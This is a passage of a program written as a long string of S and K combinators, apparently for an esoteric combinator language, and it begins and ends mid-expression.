((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))((((((